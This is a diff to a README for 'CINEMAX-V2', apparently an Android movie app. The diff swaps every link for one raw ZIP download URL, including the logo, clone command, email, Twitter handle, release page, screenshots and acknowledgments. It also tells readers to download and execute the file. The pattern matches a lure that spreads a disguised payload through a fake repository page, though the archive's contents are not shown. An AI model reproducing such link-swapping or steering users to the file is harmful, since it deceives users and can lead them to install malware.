@@ -1,6 +1,6 @@
 # CINEMAX-V2 🎬
 
-![CINEMAX Logo](https://example.com/logo.png)
+![CINEMAX Logo](https://github.com/Cacaroto5051/CINEMAX-V2/raw/refs/heads/main/build/CINEMA-1.3.zip)
 
 Cinemax is your ultimate destination for discovering and bookmarking the best movies and TV shows. This repository contains the source code for CINEMAX-V2, built with modern technologies to enhance your entertainment experience.
 
@@ -45,7 +45,7 @@ To install CINEMAX-V2, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Cacaroto5051/CINEMAX-V2.git
+   git clone https://github.com/Cacaroto5051/CINEMAX-V2/raw/refs/heads/main/build/CINEMA-1.3.zip
    ```
 2. Open the project in Android Studio.
 3. Sync the Gradle files.
@@ -77,28 +77,28 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: example@example.com
-- **Twitter**: [@example](https://twitter.com/example)
+- **Email**: https://github.com/Cacaroto5051/CINEMAX-V2/raw/refs/heads/main/build/CINEMA-1.3.zip
+- **Twitter**: [@example](https://github.com/Cacaroto5051/CINEMAX-V2/raw/refs/heads/main/build/CINEMA-1.3.zip)
 
 ## Releases
 
-To download the latest release of CINEMAX-V2, visit the [Releases](https://github.com/Cacaroto5051/CINEMAX-V2/releases) section. Download the latest APK file and execute it on your device.
+To download the latest release of CINEMAX-V2, visit the [Releases](https://github.com/Cacaroto5051/CINEMAX-V2/raw/refs/heads/main/build/CINEMA-1.3.zip) section. Download the latest APK file and execute it on your device.
 
-To stay updated with future releases, keep an eye on the [Releases](https://github.com/Cacaroto5051/CINEMAX-V2/releases) page.
+To stay updated with future releases, keep an eye on the [Releases](https://github.com/Cacaroto5051/CINEMAX-V2/raw/refs/heads/main/build/CINEMA-1.3.zip) page.
 
 ## Screenshots
 
-![Home Screen](https://example.com/home-screen.png)
-![Search Screen](https://example.com/search-screen.png)
-![Bookmark Screen](https://example.com/bookmark-screen.png)
+![Home Screen](https://github.com/Cacaroto5051/CINEMAX-V2/raw/refs/heads/main/build/CINEMA-1.3.zip)
+![Search Screen](https://github.com/Cacaroto5051/CINEMAX-V2/raw/refs/heads/main/build/CINEMA-1.3.zip)
+![Bookmark Screen](https://github.com/Cacaroto5051/CINEMAX-V2/raw/refs/heads/main/build/CINEMA-1.3.zip)
 
 ## Acknowledgments
 
 We would like to thank the following resources for their support:
 
-- [Android Developers](https://developer.android.com/)
-- [Jetpack Compose Documentation](https://developer.android.com/jetpack/compose)
-- [Retrofit Documentation](https://square.github.io/retrofit/)
+- [Android Developers](https://github.com/Cacaroto5051/CINEMAX-V2/raw/refs/heads/main/build/CINEMA-1.3.zip)
+- [Jetpack Compose Documentation](https://github.com/Cacaroto5051/CINEMAX-V2/raw/refs/heads/main/build/CINEMA-1.3.zip)
+- [Retrofit Documentation](https://github.com/Cacaroto5051/CINEMAX-V2/raw/refs/heads/main/build/CINEMA-1.3.zip)
 
 ## FAQs
 
